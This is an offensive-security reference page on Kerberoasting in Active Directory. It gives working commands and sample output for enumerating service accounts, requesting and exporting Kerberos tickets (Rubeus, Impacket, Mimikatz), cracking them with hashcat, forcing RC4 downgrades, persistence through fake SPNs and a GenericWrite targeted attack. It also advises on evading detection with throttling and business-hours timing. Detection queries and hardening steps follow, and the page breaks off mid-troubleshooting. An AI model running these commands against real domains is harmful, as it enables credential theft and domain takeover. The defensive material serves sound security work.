# Kerberoast

### Overview

**Kerberoasting** is an Active Directory attack technique that targets service accounts by requesting Kerberos TGS (Ticket Granting Service) tickets for services running under user accounts, then cracking these tickets offline to recover plaintext passwords. The attack exploits the fact that TGS tickets are encrypted with keys derived from the service account's password, and any authenticated domain user can request these tickets without special privileges.

**Key Concepts:**

* **Service Principal Name (SPN)** - Unique identifier for a service instance, registered on user accounts
* **TGS Ticket** - Service ticket encrypted with service account's password hash
* **Offline Cracking** - Extracting tickets and cracking passwords without further network interaction
* **Kerberoastable Accounts** - User accounts with non-empty SPN property (not computer accounts)

**Why this matters:** Service accounts often have:

* Weak or unchanged passwords (set years ago)
* High privileges (domain admin, local admin on multiple systems)
* No account lockout protection for offline attacks
* Long password age (never expire policies)

**Attack advantages:**

* No special privileges required (any domain user can request TGS)
* Completely offline cracking (no lockout risk)
* Difficult to detect (normal Kerberos behavior)
* High success rate against weak service account passwords

**Common vulnerable services:**

* **MSSQL** - SQL Server service accounts (MSSQLSvc/server.domain.local)
* **IIS** - Web application pools (HTTP/server.domain.local)
* **Exchange** - Mail services (exchangeMDB/server.domain.local)
* **Custom Services** - Third-party applications with service accounts

***

### Exploitation Workflow Summary

1. Reconnaissance ├─ Enumerate domain users with SPNs ├─ Identify service account types ├─ Check encryption types (RC4 vs AES) └─ Prioritize high-value targets
2. Ticket Request ├─ Request TGS tickets for SPNs ├─ Prefer RC4 encryption (easier to crack) ├─ Extract tickets from memory or save directly └─ Convert to cracking format
3. Offline Cracking ├─ Use Hashcat or John the Ripper ├─ Apply wordlists and rules ├─ Crack RC4 hashes first (faster) └─ Attempt AES if necessary
4. Credential Validation ├─ Test recovered passwords ├─ Identify account privileges ├─ Map service access └─ Plan privilege escalation
5. Post-Exploitation ├─ Authenticate as service account ├─ Access privileged resources ├─ Lateral movement └─ Potential domain admin access

***

### Understanding Service Principal Names (SPNs)

#### What are SPNs?

**SPNs** uniquely identify service instances running on servers. When a service runs under a user account (not SYSTEM or Network Service), the account must have an SPN registered in Active Directory.

**SPN format:**

```
ServiceClass/Host:Port/ServiceName
```

**Common SPN examples:**

```
MSSQLSvc/sql01.domain.local:1433
HTTP/webapp.domain.local
CIFS/fileserver.domain.local
exchangeMDB/mail01.domain.local
```

**Why SPNs exist:** When a client wants to access a service:

1. Client requests TGS ticket for specific SPN
2. KDC encrypts ticket with service account's password
3. Client presents ticket to service
4. Service decrypts ticket with its own password
5. Authentication succeeds if ticket is valid

**Attack opportunity:** The TGS ticket is encrypted with the service account's password-derived key. If we can request this ticket, we can crack it offline to recover the password.

#### Computer Accounts vs User Accounts

**Computer accounts (not kerberoastable):**

```
Naming: COMPUTER01$
Password: 120+ random characters
Rotation: Every 30 days automatically
Cracking: Computationally infeasible
SPNs: Common (HOST/, TERMSRV/, WSMAN/, etc.)
```

**User accounts (kerberoastable):**

```
Naming: svc_sql, sqlservice, webadmin
Password: Often weak, human-created
Rotation: Rarely rotated (sometimes never)
Cracking: Feasible with dictionaries
SPNs: MSSQLSvc/, HTTP/, custom services
```

**Identifying kerberoastable accounts:**

```
User accounts have SPNs but NO trailing $
Computer accounts have SPNs and end with $

Kerberoastable: HTTP/webapp.domain.local → user: webadmin
Not kerberoastable: HOST/WS01.domain.local → computer: WS01$
```

#### Encryption Types

**RC4-HMAC (etype 23) - Weaker:**

```
Hash format: $krb5tgs$23$*username*$...
Cracking speed: ~1000x faster than AES
Still common: Many environments default to RC4
Attack preference: Always request RC4 when possible
```

**AES128 (etype 17) - Stronger:**

```
Hash format: $krb5tgs$17$*username*$...
Cracking speed: Significantly slower than RC4
Modern default: Windows Server 2008 R2+
```

**AES256 (etype 18) - Strongest:**

```
Hash format: $krb5tgs$18$*username*$...
Cracking speed: Slowest to crack
Best practice: Recommended for service accounts
```

**Important:** Modern environments are moving to AES-only. Don't assume only RC4 is relevant.

***

### Enumeration

#### Linux Enumeration

**Impacket GetUserSPNs (authenticate with password):**

```bash
GetUserSPNs.py -dc-ip 10.10.10.5 DOMAIN/username
```

**Parameters:**

* `-dc-ip 10.10.10.5` - Domain controller IP address
* `DOMAIN/username` - Domain and username (prompts for password)

**Expected output:**

```
ServicePrincipalName              Name        MemberOf                                    PasswordLastSet
--------------------------------  ----------  ------------------------------------------  -------------------
MSSQLSvc/sql01.domain.local:1433  svc_sql     CN=Domain Admins,CN=Users,DC=domain,DC=local 2019-03-12 15:45:21
HTTP/webapp.domain.local          webadmin    CN=IIS_ADMINS,CN=Users,DC=domain,DC=local   2020-01-15 09:23:11
```

**Authenticate with NTLM hash:**

```bash
GetUserSPNs.py -dc-ip 10.10.10.5 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 DOMAIN/username
```

**Parameters:**

* `-hashes :NTHASH` - LM hash (empty) : NT hash for authentication

**Target specific user (reduce noise):**

```bash
GetUserSPNs.py -request-user svc_sql -dc-ip 10.10.10.5 DOMAIN/username
```

**Why target specific users:**

* Reduces detection risk
* Avoids unnecessary Event 4769 logs
* Focuses on high-value targets
* Faster execution

#### Windows Enumeration

**Built-in setspn command:**

```cmd
setspn.exe -Q */*
```

**Expected output:**

```
CN=svc_sql,CN=Users,DC=domain,DC=local
        MSSQLSvc/sql01.domain.local:1433
        MSSQLSvc/sql01.domain.local

CN=WS01,CN=Computers,DC=domain,DC=local
        HOST/WS01.domain.local
        TERMSRV/WS01.domain.local
```

**Filtering for user accounts only:** Focus on entries where the backing object is a **user**, not a **computer** (no trailing $).

**PowerView enumeration:**

```powershell
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof,pwdlastset
```

**Expected output:**

```
samaccountname serviceprincipalname              memberof                pwdlastset
-------------- --------------------              --------                ----------
svc_sql        {MSSQLSvc/sql01...}              {CN=Domain Admins...}   3/12/2019 3:45:21 PM
webadmin       {HTTP/webapp.domain.local}        {CN=IIS_ADMINS...}      1/15/2020 9:23:11 AM
```

**Rubeus statistics (recommended first step):**

```cmd
.\Rubeus.exe kerberoast /stats
```

**Expected output:**

```
[*] Total kerberoastable users : 15

[*] Encryption Type Analysis:
    RC4_HMAC: 12 (80%)
    AES128:   2 (13%)
    AES256:   1 (7%)

[*] Password Last Set Analysis:
    > 5 years ago: 5 users
    2-5 years ago: 7 users
    < 2 years ago: 3 users

[*] Privileged Account Analysis:
    Domain Admins: 2
    Enterprise Admins: 1
    Account Operators: 1
```

**Why check stats first:**

* Identifies easiest targets (RC4, old passwords)
* Shows privileged accounts worth targeting
* Helps prioritize attack strategy
* Assesses cracking difficulty

***

### Requesting and Extracting Tickets

#### Technique 1: Request to Memory and Export

**Step 1: Request service ticket to memory**

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.domain.local"
```

**What this does:**

* Uses .NET to request Kerberos ticket
* Ticket stored in current user's credential cache
* No admin privileges required
* Ticket remains in memory

**Step 2: Verify ticket in cache**

```cmd
klist
```

**Expected output:**

```
Cached Tickets: (2)

#0>     Client: user @ DOMAIN.LOCAL
        Server: MSSQLSvc/sql01.domain.local @ DOMAIN.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 12/21/2024 10:15:00 (local)
        End Time:   12/21/2024 20:15:00 (local)
        Renew Time: 12/28/2024 10:15:00 (local)
```

**Step 3: Export ticket from LSASS (requires admin)**

```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

**Expected output:**

```
[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/21/2024 10:15:00 ; 12/21/2024 20:15:00 ; 12/28/2024 10:15:00
   Server Name       : MSSQLSvc/sql01.domain.local @ DOMAIN.LOCAL
   Client Name       : user @ DOMAIN.LOCAL
   Flags 40a50000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ok_as_delegate
   * Saved to file     : 0-00000000-user@MSSQLSvc~sql01.domain.local-DOMAIN.LOCAL.kirbi
```

**Step 4: Convert to cracking format**

```bash
# Convert .kirbi to John format
python2.7 kirbi2john.py 0-00000000-user@MSSQLSvc~sql01.domain.local-DOMAIN.LOCAL.kirbi > tgs.john

# Convert John format to Hashcat (if needed)
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

#### Technique 2: Automated Tools (Recommended)

**PowerView - Single SPN to Hashcat format:**

```powershell
Request-SPNTicket -SPN "MSSQLSvc/sql01.domain.local" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

**PowerView - All user SPNs to CSV:**

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
```

**Rubeus - Default kerberoast (all SPNs):**

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

**Warning:** This requests tickets for ALL kerberoastable accounts and generates many Event 4769 logs. Very noisy!

**Rubeus - Target single account (stealthy):**

```cmd
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.kerberoast
```

**Rubeus - Target privileged accounts only:**

```cmd
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

**Parameters:**

* `/ldapfilter:'(admincount=1)'` - Only users with adminCount=1 (privileged)
* `/nowrap` - Output hash on single line (easier for cracking tools)

**Expected output:**

```
[*] Action: Kerberoasting

[*] Target User            : svc_sql
[*] Target Domain          : domain.local
[*] Searching for accounts with SPN set...

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=domain,DC=local
[*] ServicePrincipalName   : MSSQLSvc/sql01.domain.local:1433
[*] PwdLastSet             : 3/12/2019 3:45:21 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/sql01.domain.local:1433*$A1B2C3D4...

[*] Roasted hashes written to : hashes.kerberoast
```

#### Linux Automated Extraction

**Impacket - Request and save all roastable hashes:**

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.5 DOMAIN/username -outputfile hashes.kerberoast
```

**Parameters:**

* `-request` - Request TGS tickets for all kerberoastable users
* `-outputfile hashes.kerberoast` - Save hashes to file

**Expected output:**

```
ServicePrincipalName              Name      MemberOf                          PasswordLastSet
--------------------------------  --------  --------------------------------  -------------------
MSSQLSvc/sql01.domain.local:1433  svc_sql   CN=Domain Admins,CN=Users,DC=...  2019-03-12 15:45:21

[*] Kerberos keys grabbed
$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$DOMAIN.LOCAL/svc_sql*$A1B2C3D4E5F6...
```

**With NTLM hash authentication:**

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.5 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 DOMAIN/username -outputfile hashes.kerberoast
```

**Target specific user only:**

```bash
GetUserSPNs.py -request-user svc_sql -dc-ip 10.10.10.5 DOMAIN/username
```

#### kerberoast by @skelsec

**Step 1: Enumerate kerberoastable users via LDAP:**

```bash
kerberoast ldap spn 'ldap+ntlm-password://DOMAIN\\username:password@10.10.10.5' -o kerberoastable
```

**Step 2: Request TGS for selected SPNs:**

```bash
kerberoast spnroast 'kerberos+password://DOMAIN\\username:password@10.10.10.5' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

**Advantages:**

* Separates enumeration from exploitation
* Allows targeted selection of SPNs
* Reduces noise by requesting only chosen targets

***

### OPSEC and AES-Only Environments

#### Understanding Modern Defenses

**AES-only environments:** Many organizations now:

* Disable RC4 encryption entirely
* Force AES128 or AES256 for all tickets
* Monitor for RC4 usage as potential attack indicator
* Configure service accounts with AES-only support

**Detection risks:**

* Requesting RC4 in AES-only environment is suspicious
* Large bursts of TGS requests trigger alerts
* Spray-and-pray approaches are very noisy

#### RC4 Downgrade Attacks

**Request RC4 for accounts without AES:**

```cmd
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
```

**How /rc4opsec works:**

1. Uses tgtdeleg trick to enumerate accounts
2. Identifies accounts without AES support
3. Requests RC4 tickets ONLY for those accounts
4. Avoids suspicious RC4 requests in AES-hardened environments

**When to use:**

* Mixed environments (some accounts still RC4)
* Want faster cracking (RC4 much faster than AES)
* Need to stay under detection radar

**Alternative RC4 request:**

```cmd
.\Rubeus.exe kerberoast /tgtdeleg
```

**Parameters:**

* `/tgtdeleg` - Triggers RC4 requests where possible using TGT delegation trick

#### AES-Only Account Roasting

**Request AES service tickets:**

```cmd
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
```

**How /aes works:**

1. Enumerates accounts with AES enabled
2. Requests AES service tickets (etype 17/18)
3. Outputs AES-encrypted hashes for cracking
4. Doesn't fail silently on AES-only accounts

**When to use:**

* AES-only environment (RC4 disabled)
* Want comprehensive coverage
* Have powerful cracking resources

**Using existing TGT:**

```cmd
.\Rubeus.exe kerberoast /ticket:C:\temp\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

**Parameters:**

* `/ticket:` - Use existing TGT (from PTT or .kirbi file)
* `/spn:` - Target specific SPN
* Skips LDAP queries (useful from non-domain-joined hosts)

#### Targeted and Throttled Attacks

**Target specific user:**

```cmd
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

**Target specific SPN:**

```cmd
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.domain.local /nowrap
```

**Limit results:**

```cmd
.\Rubeus.exe kerberoast /resultlimit:5 /nowrap
```

**Add delay between requests:**

```cmd
.\Rubeus.exe kerberoast /delay:5000 /jitter:30
```

**Parameters:**

* `/delay:5000` - Wait 5000ms (5 seconds) between requests
* `/jitter:30` - Add random jitter ±30% to delay

**Filter by password age:**

```cmd
.\Rubeus.exe kerberoast /pwdsetbefore:01-01-2020 /nowrap
```

**Why target old passwords:**

* Likely never changed
* More likely to be weak
* Set before password policy improvements
* Higher chance of successful cracking

**Target specific OU:**

```cmd
.\Rubeus.exe kerberoast /ou:"OU=Service Accounts,DC=domain,DC=local" /nowrap
```

**Complete stealthy example:**

```cmd
# Target admin accounts with old passwords, limit to 3, add delays
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /pwdsetbefore:01-01-2021 /resultlimit:3 /delay:10000 /jitter:20 /nowrap
```

***

### Cracking Kerberoast Hashes

#### Hash Format Identification

**RC4-HMAC (etype 23) - Most common:**

```
$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/sql01.domain.local:1433*$A1B2C3D4...
```

**AES128 (etype 17):**

```
$krb5tgs$17$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/sql01.domain.local:1433*$A1B2C3D4...
```

**AES256 (etype 18):**

```
$krb5tgs$18$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/sql01.domain.local:1433*$A1B2C3D4...
```

#### John the Ripper

**Basic cracking:**

```bash
john --format=krb5tgs --wordlist=rockyou.txt hashes.kerberoast
```

**Expected output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!     (?)
1g 0:00:00:15 DONE (2024-12-21 10:15) 0.06666g/s 701867p/s 701867c/s 701867C/s
```

**Show cracked passwords:**

```bash
john --show --format=krb5tgs hashes.kerberoast
```

**Resume interrupted session:**

```bash
john --restore
```

#### Hashcat (Recommended)

**RC4-HMAC (etype 23) - Mode 13100:**

```bash
hashcat -m 13100 -a 0 hashes.rc4 rockyou.txt
```

**Parameters:**

* `-m 13100` - Kerberos 5 TGS-REP etype 23 (RC4)
* `-a 0` - Straight attack mode (wordlist)
* `hashes.rc4` - File containing RC4 hashes
* `rockyou.txt` - Password wordlist

**Expected output:**

```
hashcat (v6.2.6) starting...

* Device #1: NVIDIA GeForce RTX 3090, 24576 MB, 82MCU

Hashmode: 13100 - Kerberos 5, etype 23, TGS-REP
Speed.#1.........: 1234.5 MH/s

$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/sql01.domain.local:1433*$A1B2C3D4...:Password123!

Session..........: hashcat
Status...........: Cracked
Time.Started.....: Sat Dec 21 10:15:00 2024
Time.Estimated...: Sat Dec 21 10:15:45 2024 (45 secs)
```

**AES128 (etype 17) - Mode 19600:**

```bash
hashcat -m 19600 -a 0 hashes.aes128 rockyou.txt
```

**AES256 (etype 18) - Mode 19700:**

```bash
hashcat -m 19700 -a 0 hashes.aes256 rockyou.txt
```

**Performance comparison:**

```
RC4 (mode 13100):    ~1000 GH/s on RTX 3090
AES128 (mode 19600): ~1 GH/s on RTX 3090 (~1000x slower)
AES256 (mode 19700): ~0.5 GH/s on RTX 3090 (~2000x slower)
```

**Advanced cracking with rules:**

```bash
# Use best64 rule (common password mutations)
hashcat -m 13100 -a 0 hashes.rc4 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Combination attack (two wordlists)
hashcat -m 13100 -a 1 hashes.rc4 wordlist1.txt wordlist2.txt

# Mask attack (known patterns)
hashcat -m 13100 -a 3 hashes.rc4 ?u?l?l?l?l?l?l?d?d?d!
# Pattern: Uppercase + 6 lowercase + 3 digits + !
# Example: Password123!
```

**Show cracked passwords:**

```bash
hashcat -m 13100 hashes.rc4 --show
```

**Resume session:**

```bash
hashcat -m 13100 hashes.rc4 rockyou.txt --restore
```

***

### Persistence and Abuse

#### Making Accounts Kerberoastable

**Add SPN to any account you control:**

```powershell
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

**Why this matters:** If you compromise a low-privilege account but can modify user objects, you can:

1. Add fake SPN to make account kerberoastable
2. Request TGS ticket for that account
3. Crack the password offline
4. Use recovered password for persistent access

**Use case:**

* Persistence mechanism (you can always get the password back)
* Escalation if target account has higher privileges
* Avoid detection (SPN addition is less monitored than password resets)

#### Downgrade to RC4 for Easier Cracking

**Force RC4-only encryption:**

```powershell
Set-ADUser -Identity targetuser -Replace @{msDS-SupportedEncryptionTypes=4}
```

**msDS-SupportedEncryptionTypes values:**

```
1  = DES_CBC_CRC
2  = DES_CBC_MD5
4  = RC4_HMAC_MD5
8  = AES128_CTS_HMAC_SHA1_96
16 = AES256_CTS_HMAC_SHA1_96
24 = AES128 + AES256 (8 + 16)
28 = RC4 + AES128 + AES256 (4 + 8 + 16)
```

**Allow mixed RC4 and AES:**

```powershell
Set-ADUser -Identity targetuser -Replace @{msDS-SupportedEncryptionTypes=28}
```

**Warning:** This is very risky from blue team perspective:

* Downgrading to RC4 is suspicious
* Generates directory modification events
* May trigger security alerts
* Violates security best practices

***

### Targeted Kerberoast via GenericWrite/GenericAll

#### Understanding the Attack

When BloodHound shows you have **GenericWrite** or **GenericAll** permissions over a user object, you can perform a "targeted kerberoast" even if the user has no SPNs:

**Attack steps:**

1. Add temporary SPN to target user
2. Request RC4 TGS ticket for that SPN
3. Crack the hash offline
4. Remove SPN to clean up

**Why this works:**

* GenericWrite allows modifying user properties
* SPN is just another property
* Any user with SPN becomes kerberoastable
* You control which user to target

#### Windows Targeted Kerberoast

**Step 1: Add temporary SPN**

```powershell
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/TempSvc-12345'} -Verbose
```

**Step 2: Request RC4 TGS**

```cmd
.\Rubeus.exe kerberoast /user:targetuser /nowrap /rc4
```

**Parameters:**

* `/user:targetuser` - Target only this user
* `/nowrap` - Single line output for cracking
* `/rc4` - Request RC4 encryption (easier to crack)

**Step 3: Crack the hash**

```bash
hashcat -m 13100 targetuser.hash rockyou.txt
```

**Step 4: Remove SPN (cleanup)**

```powershell
Set-DomainObject -Identity targetuser -Clear serviceprincipalname -Verbose
```

#### Linux Automated Targeted Kerberoast

**One-liner with targetedKerberoast.py:**

```bash
targetedKerberoast.py -d 'DOMAIN.LOCAL' -u writer_account -p 'WriterPassword'
```

**What it does automatically:**

1. Prompts for target username
2. Adds temporary SPN
3. Requests TGS ticket (etype 23 / RC4)
4. Removes SPN
5. Outputs hash for cracking

**Expected output:**

```
[*] Target account: targetuser
[*] Adding SPN: fake/targetuser-1234
[+] Successfully added SPN
[*] Requesting TGS ticket...
[+] Got TGS ticket!
[*] Removing SPN...
[+] SPN removed successfully

[*] Hash:
$krb5tgs$23$*targetuser$DOMAIN.LOCAL$fake/targetuser-1234*$A1B2C3D4...

[*] Save to file: targetuser.hash
```

**Crack the output:**

```bash
hashcat -m 13100 targetuser.hash rockyou.txt
```

#### Detection Considerations

**Events generated:**

* **Event 5136** - Directory service object modified (SPN added)
* **Event 4738** - User account changed (SPN property modified)
* **Event 4769** - Kerberos service ticket requested
* **Event 5136** - Directory service object modified (SPN removed)

**Time gap matters:**

* Quick add → request → remove (seconds) is suspicious
* Longer gaps look more like legitimate admin activity
* But longer gaps = more detection window

**Recommendations:**

* Use during business hours (blend in with normal changes)
* Add delay between add and remove (seems less scripted)
* Clean up promptly (reduce detection window)
* Monitor your own operations (ensure cleanup completed)

***

### Kerberoast Without Domain Account

#### AS-Requested Service Tickets

In September 2022, Charlie Clark discovered that if a principal does **not require pre-authentication** (like AS-REP roasting), you can obtain a service ticket via a crafted `KRB_AS_REQ` by altering the `sname` field in the request body. This effectively gets a service ticket instead of a TGT, without needing valid domain credentials.

**Requirements:**

* Target user must NOT require Kerberos pre-authentication
* Must know target usernames (can't query LDAP without creds)
* Need a list of users to test

**Comparison to AS-REP roasting:**

```
AS-REP roast: Get TGT-like response without pre-auth
AS-requested ST: Get service ticket without pre-auth

Both: Exploit accounts with pre-auth disabled
Both: Don't require valid credentials
Both: Offline crackable
```

#### Linux Implementation

**Impacket GetUserSPNs (with PR #1413):**

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

**Parameters:**

* `-no-preauth "NO_PREAUTH_USER"` - Account without pre-auth requirement
* `-usersfile users.txt` - File containing potential kerberoastable usernames
* `-dc-host dc.domain.local` - Domain controller hostname
* `domain.local/` - Domain (no username/password needed)

**How it works:**

```
1. Crafts KRB_AS_REQ with modified sname field
2. Sets sname to target SPN instead of krbtgt
3. KDC responds with service ticket (if user has SPN)
4. Ticket encrypted with service account password
5. Crack offline like normal kerberoast
```

**Expected output:**

```
ServicePrincipalName              Name
--------------------------------  --------
MSSQLSvc/sql01.domain.local:1433  svc_sql

$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$...*$A1B2C3D4...
```

#### Windows Implementation

**Rubeus (with PR #139):**

```cmd
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:MSSQLSvc/sql01.domain.local
```

**Parameters:**

* `/domain:domain.local` - Target domain
* `/dc:dc.domain.local` - Domain controller
* `/nopreauth:NO_PREAUTH_USER` - Account without pre-auth
* `/spn:` - Target SPN to request

**Limitations:**

* Must know target usernames in advance
* Can't enumerate SPNs via LDAP without credentials
* Requires pre-auth disabled account
* Uncommon in well-managed environments

**See related topic:** \[\[ASREPRoast]]

***

### Detection

#### Understanding Detection Challenges

**Why kerberoasting is hard to detect:**

* Legitimate users request TGS tickets constantly
* No failed authentication attempts (offline cracking)
* Normal Kerberos behavior (not protocol abuse)
* Can be low and slow (targeted, throttled)

**Key detection strategy:** Focus on **Event 4769** (Kerberos service ticket requested) with intelligent filtering.

#### Event 4769 Analysis

**Event 4769 fields:**

```
Account Name: user@DOMAIN.LOCAL
Service Name: MSSQLSvc/sql01.domain.local
Service ID: DOMAIN\svc_sql
Ticket Encryption Type: 0x17 (RC4-HMAC)
Client Address: ::ffff:10.10.10.15
Failure Code: 0x0 (Success)
```

**Filtering to reduce noise:**

**Exclude normal activity:**

```
1. Service name != krbtgt (normal TGT requests)
2. Service name NOT ending with $ (computer account SPNs)
3. Account name NOT ending with $$ (machine account requests)
4. Only successful requests (Failure Code: 0x0)
```

**Monitor suspicious patterns:**

```
Track encryption types:
- 0x17 (RC4) - Potentially suspicious in AES-only environments
- 0x12 (AES256) - Normal in modern environments
- 0x11 (AES128) - Normal in modern environments

Important: Don't alert ONLY on RC4 (0x17)
Many legitimate services still use RC4
```

#### PowerShell Detection Script

**Triage Event 4769 for kerberoasting:**

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

**What this filters:**

1. Excludes krbtgt (TGT requests)
2. Excludes computer accounts (service name ending with $)
3. Excludes machine account requesters (account name ending with \$$)
4. Only successful requests
5. Focuses on common encryption types

#### Advanced Detection Ideas

**Baseline normal behavior:**

```
1. Track SPNs normally requested per user
2. Establish baseline of daily TGS requests
3. Alert on statistical anomalies

Example baseline:
- User A requests 5-10 TGS/day (normal workstation use)
- User A requests 50 TGS in 1 hour → ALERT
```

**Unusual patterns:**

```
Multiple distinct SPN requests from single principal:
- user@domain requests tickets for 20+ different SPNs
- Especially suspicious if SPNs are unrelated services
- Normal users access 1-5 services regularly
```

**RC4 usage monitoring (AES-hardened environments):**

```
If domain policy enforces AES:
- Any RC4 request (0x17) is suspicious
- Indicates downgrade attempt
- Possible kerberoasting attack
```

**Time-based anomalies:**

```
- Burst of TGS requests in short time window
- TGS requests during off-hours
- Requests from unusual locations/IPs
```

#### Detection Rule Example

**SIEM/Splunk query:**

```
index=windows EventCode=4769
| where (Service_Name!="krbtgt*" AND Service_Name!="*$")
| where Account_Name!="*$@*"
| where Failure_Code="0x0"
| stats count by Account_Name, Service_Name
| where count > 10
```

**What this detects:**

* Users requesting tickets for 10+ different services
* Potential spray-and-pray kerberoasting
* Automated tool usage

***

### Mitigation and Hardening

#### Managed Service Accounts (Recommended)

**gMSA (Group Managed Service Accounts):**

```
Password: 120+ random characters
Rotation: Automatic (every 30 days)
Management: Active Directory handles everything
Cracking: Computationally infeasible
```

**dMSA (Domain Managed Service Accounts):**

```
Similar to gMSA but for single server
Automatic password management
Eliminates weak password risk
```

**Why managed accounts prevent kerberoasting:**

* Passwords are 120+ characters of random data
* Would take millions of years to crack
* Automatically rotated
* No human password selection

**Implementation:**

```powershell
# Create gMSA
New-ADServiceAccount -Name gMSA_SQL -DNSHostName sql01.domain.local -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers"

# Install on server
Install-ADServiceAccount -Identity gMSA_SQL

# Configure service to use gMSA
# Service account: DOMAIN\gMSA_SQL$
# No password needed
```

#### Enforce AES Encryption

**Set msDS-SupportedEncryptionTypes to AES-only:**

```powershell
# AES-only (value 24 = AES128 + AES256)
Set-ADUser -Identity svc_sql -Replace @{msDS-SupportedEncryptionTypes=24}

# Then rotate password to generate new AES keys
Set-ADAccountPassword -Identity svc_sql -Reset
```

**Why this helps:**

* AES is \~1000x slower to crack than RC4
* Makes offline cracking much harder
* Modern security best practice

**Domain-wide RC4 disabling:**

```
Registry key on DCs:
HKLM\System\CurrentControlSet\Services\Kdc
DefaultDomainSupportedEncTypes = 0x18 (AES only)

Warning: Test thoroughly before implementing
May break legacy applications
```

#### Password Policy Hardening

**Minimum requirements for service accounts:**

```
Length: 25+ characters (30+ recommended)
Complexity: Mix of upper, lower, numbers, symbols
Expiration: 180 days maximum
History: Prevent password reuse
```

**Example strong service account password:**

```
Good: Kx9#mP2@vL4$nQ7!wR8&tY5^uI3%
Bad: ServicePassword123
Bad: CompanyName2024!
```

**Audit passwords regularly:**

```
1. Test against common wordlists
2. Check for company name patterns
3. Verify password age
4. Ensure complexity requirements met
```

#### Remove Unnecessary SPNs

**Audit current SPNs:**

```powershell
# Find all user accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName | 
  Select-Object SamAccountName, ServicePrincipalName
```

**Remove unused SPNs:**

```powershell
# If service account no longer used
Set-ADUser -Identity old_svc_account -Clear ServicePrincipalName
```

**Best practice:**

* Decommission unused service accounts
* Remove SPNs for retired services
* Regular SPN audits (quarterly)
* Document legitimate SPNs

#### Additional Hardening

**Implement monitoring:**

```
- Alert on Event 4769 anomalies
- Track SPN additions/modifications (Event 5136)
- Monitor for suspicious RC4 usage
- Baseline normal TGS request patterns
```

**Least privilege:**

```
- Service accounts should NOT be Domain Admins
- Grant only required permissions
- Use separate accounts per service
- Avoid privilege accumulation
```

**Network segmentation:**

```
- Restrict service account access
- Limit where accounts can authenticate from
- Implement tiering model
- Isolate sensitive services
```

***

### Troubleshooting

#### Error: "KRB\_AP\_ERR\_SKEW (Clock skew too great)"

**Problem:** Time difference between attacker and DC

```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**Solution (Linux):**

```bash
# Sync time with DC (ntpdate)
sudo ntpdate 10.10.10.5

# Or using rdate
sudo rdate -n 10.10.10.5

# Verify time
date
```

**Why it matters:** Kerberos requires time synchronization within 5 minutes (MaxClockSkew).

#### Error: "No Kerberoastable Users Found"

**Problem:** Enumeration returns no results

**Possible causes:**

**1. All service accounts are computer accounts:**

```bash
# Check if SPNs belong to computer accounts
GetUserSPNs.py -dc-ip 10.10.10.5 DOMAIN/username

# If all results end with $, they're computers (not kerberoastable)
```

**2. Service accounts use gMSA/dMSA:**

```
Managed accounts have 120+ char passwords
Not worth attempting to crack
Environment properly hardened
```

**3. No user accounts have SPNs:**

```
Well-managed environment
All services run under SYSTEM or computer accounts
No kerberoasting opportunities
```

**4. Insufficient permissions:**

```bash
# Verify you can query AD
